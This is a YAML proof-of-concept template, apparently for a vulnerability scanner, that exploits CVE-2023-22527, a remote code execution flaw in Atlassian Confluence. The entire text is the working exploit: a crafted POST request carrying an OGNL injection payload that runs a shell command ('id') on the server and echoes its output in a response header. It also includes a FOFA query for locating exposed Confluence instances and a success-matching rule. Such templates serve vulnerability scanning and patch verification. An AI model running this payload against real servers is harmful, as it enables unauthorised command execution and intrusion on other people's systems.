id: poc-yaml-atlassian-confluence-rce
info:
  name: Atlassian Confluence 远程代码执行漏洞(CVE-2023-22527)
  severity: critical
  tags:
  - 两高一弱
  - rce
  - CVE-2023-22527
  finger: confluence_server
  fofa: title="Confluence"
requests:
- method: POST
  path: /template/aui/text-inline.vm
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd',(new+freemarker.template.utility.Execute()).exec({'id'}))
  expression: status_code == 200 && contains(headers,"Cmd") && contains(headers,"uid=")
    && contains(headers,"gid=") && contains(body,"Confluence")
variables: {}
transport: http
